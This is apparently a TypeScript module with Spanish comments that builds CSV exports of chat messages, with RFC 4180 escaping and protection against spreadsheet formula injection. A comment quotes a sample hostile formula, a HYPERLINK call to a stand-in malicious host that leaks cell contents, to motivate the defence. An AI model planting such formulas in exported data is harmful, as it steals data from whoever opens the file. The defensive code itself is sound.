// ============================================================
// CSV de exportación (fase 7 §5) — RFC 4180 + antiinyección de
// fórmulas.
//
// Dos problemas distintos, y hay que resolver los dos:
//
// 1. **Escape de CSV (RFC 4180).** Una celda que contenga una coma, una
//    comilla doble o un salto de línea rompe el archivo si se pega tal
//    cual. La regla es: entrecomillar la celda y duplicar las comillas
//    de dentro. Los mensajes de WhatsApp traen las tres cosas a diario,
//    así que esto no es un caso de borde.
//
// 2. **Inyección de fórmulas (CSV injection / CWE-1236).** Excel, Google
//    Sheets, LibreOffice y Numbers interpretan como FÓRMULA cualquier
//    celda que empiece por `=`, `+`, `-` o `@` — y algunas versiones
//    también tras un tabulador o un retorno de carro. Un cliente escribe
//    por WhatsApp `=HYPERLINK("http://malo/"&A1,"Haz clic")` y quien
//    abra el export se lleva la ejecución en su máquina, no en la
//    nuestra. El escape del punto 1 NO protege de esto: las comillas de
//    CSV desaparecen al abrir el archivo y la fórmula queda viva.
//
//    La mitigación es prefijar un apóstrofo (`'`), que las hojas de
//    cálculo tratan como «esto es texto». Cuesta un carácter en la
//    celda —visible si el archivo se procesa con un parser en vez de
//    abrirse en Excel— y es el precio conocido de esta defensa; se
//    documenta en `docs/public-api.md` para que quien parsee el CSV
//    sepa que un valor que empezaba por `=` llega con `'` delante.
//    El formato JSON no lleva prefijo: ahí no hay intérprete que
//    engañar.
//
// Sin dependencias: `csv-stringify` haría el punto 1 y no el 2.
// ============================================================

/** Caracteres que obligan a entrecomillar una celda (RFC 4180). */
const NEEDS_QUOTES = /[",\r\n]/;

/**
 * Primer carácter que una hoja de cálculo puede leer como el comienzo de
 * una fórmula. `\t` y `\r` están porque algunas versiones de Excel
 * saltan el espacio en blanco inicial antes de decidir.
 */
const FORMULA_STARTERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * True si la celda, abierta en una hoja de cálculo, se interpretaría
 * como fórmula. Expuesta para que el test afirme la regla, no solo su
 * efecto.
 */
export function looksLikeFormula(value: string): boolean {
  return value.length > 0 && FORMULA_STARTERS.has(value[0]);
}

/**
 * Una celda lista para pegar en una línea de CSV: neutralizada contra la
 * inyección de fórmulas y entrecomillada si lo necesita.
 *
 * `null` y `undefined` salen como celda vacía (no como la cadena
 * `"null"`): un mensaje de texto no tiene `media_url` y el hueco debe
 * leerse como ausencia.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let text = typeof value === 'string' ? value : String(value);

  // Orden importante: el prefijo va ANTES del entrecomillado, para que
  // acabe dentro de las comillas y no rompa el formato.
  if (looksLikeFormula(text)) text = `'${text}`;

  if (NEEDS_QUOTES.test(text)) {
    return `"${text.replaceAll('"', '""')}"`;
  }
  return text;
}

/** Una línea de CSV a partir de sus celdas ya crudas. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',');
}

/**
 * Documento CSV completo: cabecera + filas, separadas por CRLF (lo que
 * pide RFC 4180 y lo que Excel espera en Windows), con salto final.
 *
 * `columns` fija el orden; cada fila se lee por esas claves, así que una
 * columna que falte en un objeto sale vacía en vez de desplazar el resto.
 */
export function toCsv<T>(
  columns: readonly (keyof T & string)[],
  rows: readonly T[]
): string {
  const lines = [csvRow(columns)];
  for (const row of rows) lines.push(csvRow(columns.map((c) => row[c])));
  return lines.join('\r\n') + '\r\n';
}
